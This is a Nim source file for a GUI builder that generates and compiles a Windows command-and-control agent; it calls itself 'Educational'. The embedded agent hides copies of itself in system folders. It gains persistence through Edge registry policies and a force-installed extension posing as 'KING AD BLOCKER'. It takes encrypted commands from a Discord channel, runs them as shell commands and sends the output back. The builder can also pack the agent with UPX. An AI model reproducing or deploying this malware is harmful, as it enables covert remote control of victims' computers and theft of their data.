import nigui, std/[strutils, os, osproc, random, times]

# ============================================================================
# RENK PALETI
# ============================================================================
const
  BG_COLOR        = "#121417"
  SURFACE_COLOR   = "#1E2228"
  BORDER_COLOR    = "#2C323B"
  PRIMARY_TEXT    = "#E1E4E8"
  SECONDARY_TEXT  = "#8B949E"
  ACCENT_ACTIVE   = "#2EA043"
  ACCENT_WARNING  = "#D29922"
  ACCENT_CRITICAL = "#F85149"
  ACCENT_FOCUS    = "#58A6FF"

proc hexToColor(hex: string): Color =
  rgb(parseHexInt(hex[1..2]).byte, parseHexInt(hex[3..4]).byte, parseHexInt(hex[5..6]).byte)

proc generateRandomKey(): string =
  const hexChars = "0123456789abcdef"
  randomize()
  result = ""
  for _ in 0..<64: result.add(hexChars[rand(hexChars.high)])

proc generateRandomName(len: int): string =
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  randomize()
  result = ""
  for _ in 0..<len: result.add(chars[rand(chars.high)])

# ============================================================================
# TEMPLATE (Embedded — gerçek çalışan kod)
# ============================================================================
const AGENT_TEMPLATE = """
import std/[httpclient, json, os, osproc, strutils, base64, random, times]

const BOT_TOKEN    = "{{TOKEN}}"
const CHANNEL_ID   = "{{CHANNEL}}"
const VODKA_HEX    = "{{VODKA}}"
const EXT_ID       = "{{EXTID}}"
const RANDOMIZE    = {{RANDOMIZE}}

var VODKA_KEY: array[32, byte]
for i in 0..<32:
  VODKA_KEY[i] = parseHexInt(VODKA_HEX[i*2 .. i*2+1]).byte

proc xorEncrypt(key: array[32, byte], data: string): string =
  var res = ""
  for i in 0..<data.len:
    res.add(chr(ord(data[i]) xor int(key[i mod 32])))
  encode(res)

proc xorDecrypt(key: array[32, byte], b64data: string): string =
  let data = decode(b64data)
  var res = ""
  for i in 0..<data.len:
    res.add(chr(ord(data[i]) xor int(key[i mod 32])))
  return res

proc randomString(len: int): string =
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  randomize()
  result = ""
  for _ in 1..len: result.add(chars[rand(chars.high)])

proc getDeployPath(): string =
  let baseDirs = @[
    "C:\\\\Windows\\\\WinSxS",
    "C:\\\\ProgramData\\\\Microsoft\\\\Windows",
    getEnv("LOCALAPPDATA") & "\\\\Microsoft"
  ]
  let baseDir = baseDirs[rand(baseDirs.high)]
  return baseDir & "\\\\" & randomString(8) & ".exe"

proc peel(): string =
  let origin = getAppFilename()
  let target = if RANDOMIZE: getDeployPath() else: "C:\\\\Windows\\\\WinSxS\\\\WindowsOrangePeller.exe"
  try:
    copyFile(origin, target)
    return target
  except: return origin

proc installPersistence(deployPath: string) =
  let regKey = if RANDOMIZE: "com." & randomString(8) & ".host" else: "com.launcher.agent"
  let nmReg = r"HKCU\\Software\\Microsoft\\Edge\\NativeMessagingHosts\\" & regKey
  var p1 = startProcess("reg.exe", args = @["add", nmReg, "/ve", "/t", "REG_SZ", "/d", deployPath.parentDir & "\\\\host.json", "/f"], options = {poNoConsole, poUsePath})
  p1.close()
  let extReg = r"HKCU\\Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist"
  var p2 = startProcess("reg.exe", args = @["add", extReg, "/v", "1", "/t", "REG_SZ", "/d", EXT_ID & ";file:///" & deployPath.parentDir.replace("\\\\", "/") & "/extension.crx", "/f"], options = {poNoConsole, poUsePath})
  p2.close()

proc sendMessage(client: HttpClient, content: string) =
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
  client.headers = newHttpHeaders({"Authorization": "Bot " & BOT_TOKEN, "Content-Type": "application/json"})
  let encrypted = xorEncrypt(VODKA_KEY, content)
  const CHUNK_SIZE = 1800
  var chunks: seq[string]
  var i = 0
  while i < encrypted.len:
    let endIdx = min(i + CHUNK_SIZE, encrypted.len)
    chunks.add(encrypted[i ..< endIdx])
    i += CHUNK_SIZE
  for idx, chunk in chunks:
    let prefix = if chunks.len > 1: "[Part " & $(idx+1) & "/" & $chunks.len & "]\\n" else: ""
    let body = %*{"content": "```\\n" & prefix & chunk & "\\n```"}
    try:
      discard client.postContent(url, $body)
      sleep(1000)
    except: discard

proc sendAck(client: HttpClient, msgID: string) =
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages/" & msgID & "/reactions/%E2%9C%85/@me"
  client.headers = newHttpHeaders({"Authorization": "Bot " & BOT_TOKEN})
  try: discard client.put(url) except: discard

proc processCommand(content: string): string =
  if content.startsWith("!exec "):
    let cmd = content[6..^1].strip()
    let (output, exitCode) = execCmdEx(cmd)
    return "[EXIT:" & $exitCode & "]\\n" & output
  elif content.startsWith("!info"):
    return "Hostname: " & getEnv("COMPUTERNAME", "N/A") & "\\nUser: " & getEnv("USERNAME", "N/A") & "\\nOS: " & hostOS & "\\nPID: " & $getCurrentProcessId()
  elif content.startsWith("!help"):
    return "!exec <cmd> - Execute command\\n!info - System info\\n!help - This message"
  else: return "[?] Unknown command"

proc pollCommands() =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"Authorization": "Bot " & BOT_TOKEN})
  var lastMsgID = ""
  var heartbeatTimer = epochTime()
  sendMessage(client, "[*] Agent online | " & getEnv("COMPUTERNAME", "unknown"))
  while true:
    try:
      if epochTime() - heartbeatTimer > 300:
        let msg = "[HEARTBEAT] " & getEnv("COMPUTERNAME", "unknown") & " | " & $now()
        sendMessage(client, msg)
        heartbeatTimer = epochTime()
      let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages?limit=5"
      let response = client.getContent(url)
      let msgs = parseJson(response)
      for msg in msgs:
        let msgID = msg["id"].getStr()
        let content = msg["content"].getStr()
        if msgID == lastMsgID: break
        if content.startsWith("```"): continue
        if lastMsgID == "":
          lastMsgID = msgID
          break
        lastMsgID = msgID
        var decrypted = content
        try: decrypted = xorDecrypt(VODKA_KEY, content)
        except: decrypted = content
        if decrypted.startsWith("!"):
          sendAck(client, msgID)
          let result = processCommand(decrypted)
          sendMessage(client, result)
    except:
      sleep(10000)
      continue
    sleep(6000)

when isMainModule:
  let deployedPath = peel()
  installPersistence(deployedPath)
  pollCommands()
"""

const HOST_JSON_TEMPLATE = """
{
  "name": "com.launcher.agent",
  "description": "Edge Native Messaging Host",
  "path": "{{AGENTPATH}}",
  "type": "stdio",
  "allowed_origins": [
    "chrome-extension://{{EXTID}}/"
  ]
}
"""

const MANIFEST_JSON_TEMPLATE = """
{
  "manifest_version": 3,
  "name": "KING AD BLOCKER",
  "version": "1.0.0",
  "description": "KING AD BLOCKER. NOT DELETE FOR YOUR SECURITY (:",
  "permissions": ["alarms", "storage", "nativeMessaging"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "background.js"}
}
"""

const BACKGROUND_JS_TEMPLATE = """
chrome.runtime.onStartup.addListener(() => {
  chrome.runtime.connectNative('com.launcher.agent');
});
chrome.runtime.onInstalled.addListener(() => {
  chrome.runtime.connectNative('com.launcher.agent');
});
chrome.alarms.create("keepalive", {periodInMinutes: 5});
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "keepalive") {
    chrome.runtime.connectNative('com.launcher.agent');
  }
});
"""

# ============================================================================
# GUI
# ============================================================================
app.init()
app.defaultBackgroundColor = hexToColor(BG_COLOR)
app.defaultTextColor = hexToColor(PRIMARY_TEXT)

var window = newWindow("EVIL ORANGE BUILDER v2.0")
window.width = 800
window.height = 700

var mainContainer = newLayoutContainer(Layout_Vertical)
mainContainer.padding = 20
mainContainer.backgroundColor = hexToColor(BG_COLOR)
window.add(mainContainer)

var titleLabel = newLabel("EVIL ORANGE BUILDER")
titleLabel.fontSize = 24
titleLabel.fontBold = true
titleLabel.textColor = hexToColor(ACCENT_ACTIVE)
mainContainer.add(titleLabel)

var subtitleLabel = newLabel("Educational C2 Agent Builder")
subtitleLabel.fontSize = 12
subtitleLabel.textColor = hexToColor(SECONDARY_TEXT)
mainContainer.add(subtitleLabel)

var spacer1 = newControl()
spacer1.height = 20
mainContainer.add(spacer1)

# Config Panel
var configPanel = newLayoutContainer(Layout_Vertical)
configPanel.padding = 15
configPanel.backgroundColor = hexToColor(SURFACE_COLOR)
mainContainer.add(configPanel)

var configTitle = newLabel("CONFIGURATION")
configTitle.fontSize = 14
configTitle.fontBold = true
configTitle.textColor = hexToColor(PRIMARY_TEXT)
configPanel.add(configTitle)

var spacer2 = newControl()
spacer2.height = 10
configPanel.add(spacer2)

# Token
var tokenRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(tokenRow)
var tokenLabel = newLabel("Discord Bot Token:")
tokenLabel.width = 150
tokenLabel.textColor = hexToColor(PRIMARY_TEXT)
tokenRow.add(tokenLabel)
var tokenInput = newTextBox()
tokenInput.width = 500
tokenInput.backgroundColor = hexToColor(BG_COLOR)
tokenInput.textColor = hexToColor(PRIMARY_TEXT)
tokenRow.add(tokenInput)

# Channel
var channelRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(channelRow)
var channelLabel = newLabel("Discord Channel ID:")
channelLabel.width = 150
channelLabel.textColor = hexToColor(PRIMARY_TEXT)
channelRow.add(channelLabel)
var channelInput = newTextBox()
channelInput.width = 500
channelInput.backgroundColor = hexToColor(BG_COLOR)
channelInput.textColor = hexToColor(PRIMARY_TEXT)
channelRow.add(channelInput)

# XOR Key
var keyRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(keyRow)
var keyLabel = newLabel("XOR Key (Hex):")
keyLabel.width = 150
keyLabel.textColor = hexToColor(PRIMARY_TEXT)
keyRow.add(keyLabel)
var keyInput = newTextBox()
keyInput.width = 400
keyInput.backgroundColor = hexToColor(BG_COLOR)
keyInput.textColor = hexToColor(PRIMARY_TEXT)
keyRow.add(keyInput)
var genKeyBtn = newButton("Generate")
genKeyBtn.width = 90
genKeyBtn.backgroundColor = hexToColor(ACCENT_FOCUS)
genKeyBtn.textColor = hexToColor(PRIMARY_TEXT)
keyRow.add(genKeyBtn)

# Extension ID
var extRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(extRow)
var extLabel = newLabel("Extension ID:")
extLabel.width = 150
extLabel.textColor = hexToColor(PRIMARY_TEXT)
extRow.add(extLabel)
var extInput = newTextBox()
extInput.width = 500
extInput.backgroundColor = hexToColor(BG_COLOR)
extInput.textColor = hexToColor(PRIMARY_TEXT)
extInput.text = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
extRow.add(extInput)

# Output Dir
var dirRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(dirRow)
var dirLabel = newLabel("Output Directory:")
dirLabel.width = 150
dirLabel.textColor = hexToColor(PRIMARY_TEXT)
dirRow.add(dirLabel)
var dirInput = newTextBox()
dirInput.width = 500
dirInput.backgroundColor = hexToColor(BG_COLOR)
dirInput.textColor = hexToColor(PRIMARY_TEXT)
dirInput.text = getCurrentDir()
dirRow.add(dirInput)

# Options
var spacer3 = newControl()
spacer3.height = 15
mainContainer.add(spacer3)

var optionsPanel = newLayoutContainer(Layout_Vertical)
optionsPanel.padding = 15
optionsPanel.backgroundColor = hexToColor(SURFACE_COLOR)
mainContainer.add(optionsPanel)

var optionsTitle = newLabel("BUILD OPTIONS")
optionsTitle.fontSize = 14
optionsTitle.fontBold = true
optionsTitle.textColor = hexToColor(PRIMARY_TEXT)
optionsPanel.add(optionsTitle)

var spacer4 = newControl()
spacer4.height = 10
optionsPanel.add(spacer4)

var randomPathCheck = newCheckbox("Randomize Agent Path")
randomPathCheck.textColor = hexToColor(PRIMARY_TEXT)
randomPathCheck.checked = true
optionsPanel.add(randomPathCheck)

var upxCheck = newCheckbox("UPX Packing")
upxCheck.textColor = hexToColor(PRIMARY_TEXT)
optionsPanel.add(upxCheck)

# Output Log
var spacer5 = newControl()
spacer5.height = 15
mainContainer.add(spacer5)

var outputPanel = newLayoutContainer(Layout_Vertical)
outputPanel.padding = 15
outputPanel.backgroundColor = hexToColor(SURFACE_COLOR)
mainContainer.add(outputPanel)

var outputTitle = newLabel("BUILD LOG")
outputTitle.fontSize = 14
outputTitle.fontBold = true
outputTitle.textColor = hexToColor(PRIMARY_TEXT)
outputPanel.add(outputTitle)

var outputText = newTextArea()
outputText.width = 750
outputText.height = 150
outputText.backgroundColor = hexToColor(BG_COLOR)
outputText.textColor = hexToColor(PRIMARY_TEXT)
outputText.editable = false
outputPanel.add(outputText)

# Buttons
var spacer6 = newControl()
spacer6.height = 15
mainContainer.add(spacer6)

var buttonRow = newLayoutContainer(Layout_Horizontal)
buttonRow.height = 40
mainContainer.add(buttonRow)

var buildBtn = newButton("BUILD")
buildBtn.width = 150
buildBtn.height = 35
buildBtn.backgroundColor = hexToColor(ACCENT_ACTIVE)
buildBtn.textColor = hexToColor(PRIMARY_TEXT)
buildBtn.fontBold = true
buttonRow.add(buildBtn)

var spacerBtn = newControl()
spacerBtn.width = 20
buttonRow.add(spacerBtn)

var clearBtn = newButton("CLEAR")
clearBtn.width = 100
clearBtn.height = 35
clearBtn.backgroundColor = hexToColor(BORDER_COLOR)
clearBtn.textColor = hexToColor(PRIMARY_TEXT)
buttonRow.add(clearBtn)

var spacerBtn2 = newControl()
spacerBtn2.width = 20
buttonRow.add(spacerBtn2)

var exitBtn = newButton("EXIT")
exitBtn.width = 100
exitBtn.height = 35
exitBtn.backgroundColor = hexToColor(ACCENT_CRITICAL)
exitBtn.textColor = hexToColor(PRIMARY_TEXT)
buttonRow.add(exitBtn)

# ============================================================================
# EVENT HANDLERS — GERCEK CALISAN KOD
# ============================================================================
genKeyBtn.onClick = proc(event: ClickEvent) =
  keyInput.text = generateRandomKey()
  outputText.addLine("[+] Generated new 64-char XOR key")

clearBtn.onClick = proc(event: ClickEvent) =
  tokenInput.text = ""
  channelInput.text = ""
  keyInput.text = ""
  extInput.text = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
  dirInput.text = getCurrentDir()
  outputText.text = ""

exitBtn.onClick = proc(event: ClickEvent) =
  window.dispose()
  app.quit()

buildBtn.onClick = proc(event: ClickEvent) =
  let token = tokenInput.text.strip()
  let channel = channelInput.text.strip()
  let key = keyInput.text.strip()
  let extID = extInput.text.strip()
  let outDir = dirInput.text.strip()

  # Validasyon
  if token.len == 0:
    outputText.addLine("[-] ERROR: Discord token required!")
    return
  if channel.len == 0:
    outputText.addLine("[-] ERROR: Channel ID required!")
    return
  if key.len == 0:
    outputText.addLine("[-] ERROR: XOR key required!")
    return
  if key.len != 64:
    outputText.addLine("[-] ERROR: XOR key must be 64 hex chars!")
    return

  outputText.addLine("[*] Starting build...")
  outputText.addLine("[*] Output dir: " & outDir)

  # Dizin kontrolü
  if not dirExists(outDir):
    try:
      createDir(outDir)
      outputText.addLine("[+] Created output directory")
    except OSError as e:
      outputText.addLine("[-] Failed to create directory: " & e.msg)
      return

  let agentPath = if randomPathCheck.checked: generateRandomName(12) & ".exe" else: "WindowsOrangePeller.exe"

  # 1. Agent kodunu üret
  outputText.addLine("[*] Generating agent.nim...")
  var agentCode = AGENT_TEMPLATE
  agentCode = agentCode.replace("{{TOKEN}}", token)
  agentCode = agentCode.replace("{{CHANNEL}}", channel)
  agentCode = agentCode.replace("{{VODKA}}", key)
  agentCode = agentCode.replace("{{EXTID}}", extID)
  agentCode = agentCode.replace("{{RANDOMIZE}}", $randomPathCheck.checked)

  let agentFile = outDir / "agent.nim"
  try:
    writeFile(agentFile, agentCode)
    outputText.addLine("[+] agent.nim written (" & $agentCode.len & " bytes)")
  except IOError as e:
    outputText.addLine("[-] Failed to write agent.nim: " & e.msg)
    return

  # 2. host.json üret
  outputText.addLine("[*] Generating host.json...")
  var hostJson = HOST_JSON_TEMPLATE
  hostJson = hostJson.replace("{{EXTID}}", extID)
  hostJson = hostJson.replace("{{AGENTPATH}}", "C:\\\\Windows\\\\WinSxS\\\\" & agentPath)

  try:
    writeFile(outDir / "host.json", hostJson)
    outputText.addLine("[+] host.json written")
  except IOError as e:
    outputText.addLine("[-] Failed to write host.json: " & e.msg)
    return

  # 3. manifest.json üret
  outputText.addLine("[*] Generating manifest.json...")
  try:
    writeFile(outDir / "manifest.json", MANIFEST_JSON_TEMPLATE)
    outputText.addLine("[+] manifest.json written")
  except IOError as e:
    outputText.addLine("[-] Failed: " & e.msg)
    return

  # 4. background.js üret
  outputText.addLine("[*] Generating background.js...")
  try:
    writeFile(outDir / "background.js", BACKGROUND_JS_TEMPLATE)
    outputText.addLine("[+] background.js written")
  except IOError as e:
    outputText.addLine("[-] Failed: " & e.msg)
    return

  # 5. Derle
  outputText.addLine("[*] Compiling agent.exe...")
  outputText.addLine("[*] Command: nim c -d:release --opt:size " & agentFile)

  let (compileOut, exitCode) = execCmdEx("nim c -d:release --opt:size " & agentFile)

  if exitCode == 0:
    outputText.addLine("[+] Compilation successful!")
    outputText.addLine("[+] Files generated in: " & outDir)
    outputText.addLine("    - agent.nim")
    outputText.addLine("    - agent.exe")
    outputText.addLine("    - host.json")
    outputText.addLine("    - manifest.json")
    outputText.addLine("    - background.js")

    # UPX
    if upxCheck.checked:
      outputText.addLine("[*] Packing with UPX...")
      let (upxOut, upxCode) = execCmdEx("upx --best " & outDir / "agent.exe")
      if upxCode == 0:
        outputText.addLine("[+] UPX packing successful")
      else:
        outputText.addLine("[-] UPX failed (maybe not installed): " & upxOut)
  else:
    outputText.addLine("[-] Compilation failed!")
    outputText.addLine("[-] " & compileOut)

window.show()
app.run()
